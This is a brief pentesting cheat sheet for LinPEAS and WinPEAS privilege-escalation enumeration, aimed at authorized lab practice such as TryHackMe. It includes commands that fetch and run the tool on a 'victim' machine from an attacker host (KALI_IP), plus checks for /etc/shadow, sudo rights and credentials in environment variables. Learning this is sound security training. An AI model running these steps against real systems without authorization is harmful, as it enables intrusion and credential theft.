# PEASS-ng — LinPEAS and WinPEAS for Privilege Escalation

Run PEASS after getting a low-privilege shell to find PrivEsc vectors. Only use on VMs you own or authorized targets.

## Download Latest LinPEAS

```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
```

## Transfer to Target

Set up file server on Kali (your attacker machine):

```bash
python3 -m http.server 8080
```

On the victim Linux machine:

```bash
wget http://KALI_IP:8080/linpeas.sh
# or
curl http://KALI_IP:8080/linpeas.sh -o linpeas.sh
```

## Run LinPEAS

```bash
chmod +x linpeas.sh
./linpeas.sh 2>/dev/null | tee linpeas.out
```

## Reading LinPEAS Output

Color coding (if terminal supports it):
- RED/YELLOW — critical findings, check these first
- GREEN — interesting but less critical
- BLUE/CYAN — informational

Key sections to review:

```
[+] Sudo version
[+] SUID files
[+] Interesting writable files
[+] Cron jobs
[+] Services running as root
[+] Network interfaces and ports
[+] Interesting files in home dirs
[+] Password files
[+] SSH keys
```

## Download and Run WinPEAS

On Kali:

```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe -o winpeas.exe
```

Transfer to Windows target:

```cmd
certutil -urlcache -f http://KALI_IP:8080/winpeas.exe winpeas.exe
powershell -c "Invoke-WebRequest -Uri http://KALI_IP:8080/winpeas.exe -OutFile winpeas.exe"
```

Run:

```cmd
winpeas.exe
winpeas.exe quiet   # less output, faster
```

## Manual Checks After LinPEAS

```bash
sudo -l                          # what can this user sudo?
find / -perm -4000 2>/dev/null   # SUID files
crontab -l && cat /etc/crontab   # cron jobs
ls -la /etc/passwd /etc/shadow   # world-readable shadow?
env                              # environment variables with credentials?
```

## Practice

TryHackMe "Linux PrivEsc" room — run linpeas.sh and manually verify each finding it reports.
